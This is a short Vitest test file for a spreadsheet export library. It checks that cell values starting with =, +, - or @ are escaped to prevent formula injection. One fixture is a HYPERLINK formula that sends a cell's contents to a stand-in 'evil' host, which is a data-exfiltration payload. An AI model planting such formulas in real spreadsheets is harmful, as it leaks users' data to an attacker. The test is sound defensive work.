import { describe, it, expect } from 'vitest';
import { buildWorkbook, parseWorkbook } from '@/lib/excel';

describe('lib/excel — formula injection escape (QA-021)', () => {
  it('escapes leading = + - @ in cell values when building a workbook', async () => {
    const wb = await buildWorkbook(
      [
        { name: '=HYPERLINK("http://evil/?x="&A1)' },
        { name: '+1+2' },
        { name: '-1' },
        { name: '@SUM(A1:A2)' },
        { name: 'Normal Shop Name' },
      ],
      'Test'
    );
    const buf = (await wb.xlsx.writeBuffer()) as ArrayBuffer;
    const sheets = await parseWorkbook(buf);
    const cells = sheets[0].rows.map((r) => r['name']);
    expect(cells[0]).toBe(`'=HYPERLINK("http://evil/?x="&A1)`);
    expect(cells[1]).toBe(`'+1+2`);
    expect(cells[2]).toBe(`'-1`);
    expect(cells[3]).toBe(`'@SUM(A1:A2)`);
    expect(cells[4]).toBe(`Normal Shop Name`); // unchanged
  });
});
